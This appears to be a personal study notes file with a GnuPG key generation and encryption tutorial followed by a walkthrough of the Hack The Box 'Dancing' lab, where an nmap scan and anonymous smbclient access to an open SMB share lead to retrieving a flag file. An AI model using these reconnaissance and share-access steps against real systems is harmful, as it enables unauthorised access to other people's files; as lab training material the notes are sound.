# Security Exercises 

### openpgp for cryptographic key sharing on linux kernel

`gpg --list-keys`

the list will show on terminal as following
pub...
uid...

use the following command to generate your own personal key!
`gpg --full-generate-key`

```bash
gpg (GnuPG) 2.2.32; Copyright (C) 2021 Free Software Foundation, Inc.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Please select what kind of key you want:
   (1) RSA and RSA (default)
   (2) DSA and Elgamal
   (3) DSA (sign only)
   (4) RSA (sign only)
  (14) Existing key from card
Your selection? 

1 

RSA keys may be between 1024 and 4096 bits long.
What keysize do you want? (3072)

3072

Requested keysize is 3072 bits
Please specify how long the key should be valid.

Please specify how long the key should be valid.
         0 = key does not expire
      <n>  = key expires in n days
      <n>w = key expires in n weeks
      <n>m = key expires in n months
      <n>y = key expires in n years
Key is valid for? (0) 

Key does not expire at all 
Is this correct (y/N) y

GnuPG needs to construct a user ID to identify your key

Real name: xxx
Email address: xxx@xxx.com
Comment:
You selected this USER-ID: 
  "xxx <xxx@xxx.com>"

Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit?

o

We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
gpg: key C9363C374D7A30D6 marked as ultimately trusted
gpg: revocation certificate stored as '/home/chae/.gnupg/openpgp-revocs.d/8533F3FA4572075FA5D655BCC9someverylonghashwithnumbers.rev'
public and secret key created and signed.

pub rsaxxx
uid xxx <xxx@xxx.com>
sub rsaxxx 
```
`gpg --list-secret-keys`

```bash
sec rsa_xxx
uid
ssb
```

now let's export the new key
`gpg --armor --ouptut public-key-of-xxx.asc --export xxx@xxx.com `

you get a result somewhat like this...
```bash
-----BEGIN PGP PUBLIC KEY BLOCK-----
.............................................
.............................................
-----END PGP PUBLIC KEY BLOCK-----
```
you can also have some fun encryptingand decrypting files using the generated key
`gpg --output encryptedfile.gpg --encrypt --sign --armor --recipient yyy@yyy.com`
`gpg --import encryptedfile.gpg`
`gpg --decrypt encryptedfile > decryptedfile.txt`

this outputs the following
`gpg: encrypted with 3072-bit RSA key, ID xxxx, created xxxx-xx-xx`

### Hackthebox -Starting-point-Dancing exercise

`nmap -sV 10.129.110.188`

nmap command shows services running on respective ports
```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-01 18:16 CET
Nmap scan report for 10.129.110.188
Host is up (0.030s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.70 seconds
```

smb refers to server message block, a common client server communication protocol 
You can use smbclient to access the smb share
Use help command to see command usage
`smbclient -h`

```bash
Usage: smbclient [-?EgqBNPkV] [-?|--help] [--usage] [-M|--message=HOST]
        [-I|--ip-address=IP] [-E|--stderr] [-L|--list=HOST] [-T|--tar=<c|x>IXFvgbNan]
        [-D|--directory=DIR] [-c|--command=STRING] [-b|--send-buffer=BYTES]
        [-t|--timeout=SECONDS] [-p|--port=PORT] [-g|--grepable] [-q|--quiet]
        [-B|--browse] [-d|--debuglevel=DEBUGLEVEL] [--debug-stdout]
        [-s|--configfile=CONFIGFILE] [--option=name=value]
        [-l|--log-basename=LOGFILEBASE] [--leak-report] [--leak-report-full]
        [-R|--name-resolve=NAME-RESOLVE-ORDER] [-O|--socket-options=SOCKETOPTIONS]
        [-m|--max-protocol=MAXPROTOCOL] [-n|--netbiosname=NETBIOSNAME]
        [--netbios-scope=SCOPE] [-W|--workgroup=WORKGROUP] [--realm=REALM]
        [-U|--user=[DOMAIN/]USERNAME[%PASSWORD]] [-N|--no-pass] [--password=STRING]
        [--pw-nt-hash] [-A|--authentication-file=FILE] [-P|--machine-pass]
        [--simple-bind-dn=DN] [--use-kerberos=desired|required|off]
        [--use-krb5-ccache=CCACHE] [--use-winbind-ccache]
        [--client-protection=sign|encrypt|off] [-k|--kerberos] [-V|--version]
        [OPTIONS] service <password>
```


Use smbclient command to connect to ip address of target machine given on hackthebox
`sudo smbclient -L 10.129.110.188`

```bash

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk  
```

use command to get into disk
`smbclient \\\\10.129.110.188\\Workshares`

you're inside! now look around and capture the flag
```bash
smb: \> ls
  .                                   D        0  Mon Mar 29 10:22:01 2021
  ..                                  D        0  Mon Mar 29 10:22:01 2021
  Amy.J                               D        0  Mon Mar 29 11:08:24 2021
  James.P                             D        0  Thu Jun  3 10:38:03 2021

                5114111 blocks of size 4096. 1751194 blocks available
smb: \> cd Amy.J
smb: \Amy.J\> ls
  .                                   D        0  Mon Mar 29 11:08:24 2021
  ..                                  D        0  Mon Mar 29 11:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 12:00:37 2021

                5114111 blocks of size 4096. 1751178 blocks available
smb: \Amy.J\> 
smb: \Amy.J\> Amy.j
Amy.j: command not found
smb: \Amy.J\> cd /
smb: \> cd James.P
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 10:38:03 2021
  ..                                  D        0  Thu Jun  3 10:38:03 2021
  flag.txt                            A       32  Mon Mar 29 11:26:57 2021

                5114111 blocks of size 4096. 1751178 blocks available
smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 32 as flag.txt (0,2 KiloBytes/sec) (average 0,2 KiloBytes/sec)
```
